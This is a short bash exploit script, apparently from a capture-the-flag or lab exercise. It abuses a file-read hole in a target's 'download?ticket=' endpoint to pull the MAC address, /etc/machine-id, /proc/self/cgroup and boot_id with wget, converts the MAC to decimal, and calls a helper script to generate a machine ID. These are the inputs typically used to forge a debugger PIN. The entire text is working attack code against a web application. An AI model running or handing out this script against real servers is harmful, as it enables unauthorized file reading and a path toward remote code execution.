rhost=$1
target="http://$rhost/download?ticket="
echo "Downloading MAC address"
wget "$target/sys/class/net/eth0/address" -O data/mac_address  --tries 0
echo "Downloading machine-id"
wget "$target/etc/machine-id" -O data/machine_id  --tries 0
echo "Downloading cgroup"
wget "$target/proc/self/cgroup" -O data/cgroup  --tries 0
echo "Downloading boot_id"
wget "$target/proc/sys/kernel/random/boot_id" -O data/boot_id  --tries 0
echo "Convert mac from hex to dec"

hex_mac=$(sed 's/://g' data/mac_address)
dec_mac=$(printf "%d" 0x$hex_mac)
echo "MAC: $dec_mac"
#echo $((16#${hex_mac}))

echo "Generating MachineID"
python custom_init.py
